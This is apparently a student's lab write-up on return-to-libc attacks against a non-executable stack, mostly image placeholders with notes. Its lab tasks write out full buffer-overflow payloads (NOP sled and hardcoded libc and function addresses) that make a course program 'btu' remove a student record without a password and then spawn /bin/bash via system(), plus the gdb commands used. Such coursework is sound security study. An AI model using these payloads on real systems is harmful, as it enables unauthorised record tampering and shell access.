# Attacking Non-executable Stack
![alt text](image-29.png)
![alt text](image-30.png)

## Return to Libc Attack:
![alt text](image-31.png)
![alt text](image-32.png)

## Launching the Attack Steps:
![alt text](image-33.png)

### Task A: Finding system() address
![alt text](image-35.png)
![alt text](image-34.png)
* we must run the program in the debug mode using gdb
* then we perform run command
* then we look for the system addres:
    > gdb programName

    > run

    > p system

### Task B: Finding the address of the string "bin/sh"
![alt text](image-37.png)

![alt text](image-38.png)

* Following all the instructions given you I got these results: 
    * ![alt text](image-36.png)

### TASK C: Launching the return-to-libc attack: 
![alt text](image-39.png)
![alt text](image-40.png)
#### Function Prologue
![alt text](image-41.png)
![alt text](image-42.png)

#### Function Epilogue
![alt text](image-43.png)
![alt text](image-44.png)

#### Back to the main task
![alt text](image-45.png)
![alt text](image-46.png)

#### Lets see how to construct malicious input: 
* ![alt text](image-48.png)

* On following the instructions I got these results: 
    * ![alt text](image-47.png)

#### Writing python script to create our malicious input file: 


## Coming to our Lab
### Task 3.1: 
* To be able to bypass the password, we can check the address of the exmatriculate function from gdb
    - ![alt text](image-53.png)
* so we can see it is **0x0804b0bb**
* then using the same code as before we can just modify the return address to be this address, and we can see that the pointer will return to the function. 
    - ![alt text](image-54.png)
* now the problem will be to send the parameters correctly because we only jump to the function, however its parameters are not loaded.
* in order to do so we must understand the structure of the stack at this point
    - payload
    - return address of the function -> exmatriculate
    - dummy return address after it finishes excution.
    - the parameters which should be our id in this case.
* So our goal now is to craft our payload in such way that we construct this successfuly, so it should be as follows: 
    - nop sled
    - base pointer address
    - exmatriculate address
    - dummy address to be excuted after finishing exmatriculate
    - our id address.
* base pointer address is: **0xffffc888**
* exmatriculate address is: **0x0804b0a8**
* exit address is: **0xf7b51460**
* Student id memory location: **0x08057d50**
* BTU object address is: **0x08050de0**
* this is my payload: gdb --gdb --args ./build/bin/btu remove 1782914303 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x88\xc8\xff\xff\xa8\xb0\x04\x08\x60\x14\xb5\xf7\xe0\x0d\x05\x08\xff\x1c\x45\x6a")
* you can find the code which generates this payload at: **Buffer_Overflow/task_3_writeup.md**


* and now we can see that we already removed the student.
![alt text](image-55.png)



### Task 3.2: 
* now its time to see what attacker can do further: 

* we want to excute the system function () and to send as argument **bin/bash** in order to open the terminal to have a full access on the victim device. 

* in order to do so we need the following: 
    - system function address
    - exit address 
    - bin/bash address -> this is the tricky part here 
* to get the bin/bash address we need to place it in the enviroment variables and use this command to get its address:
    > x/50s *((char **)environ)

    - 0xffffcccf:     "SHELL=/bin/bash" -> this is my result
* before so we must excute these commands to put it in the enviroment variable: 
    > export SHELL=/bin/bash
* to get the address of **system() function** we should use this command: 
    > p system
    
    - pwndbg> p system 
    - $1 = {int (const char *)} 0xf7b5f170 <__libc_system>
* we have the address of exit from the previous task: **0xf7b51460**
* now we are ready to build the payload:
    - nop sled * 48
    - original ebp
    - address system
    - address of exit 
    - address of "/bin/bash" string
* so this should be the command to be excuted: 
    -  > python task3_part2_payload_generator.py 
    -  > gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x88\xc8\xff\xff\x70\xf1\xb5\xf7\x60\x14\xb5\xf7\xd7\xcc\xff\xff")
# ems7 el 7eta de abl mtru7 el mon2sha w efhm leh el shell msh stable. 
> e3ml run mrten wra b3d 34an yeft7lk shell     
-  > r
-  > r
- ![alt text](image-57.png)


* so we can see now that we got a terminal, and on running **whoami** i got the result **abdelazizsalah**
    - ![alt text](image-56.png)
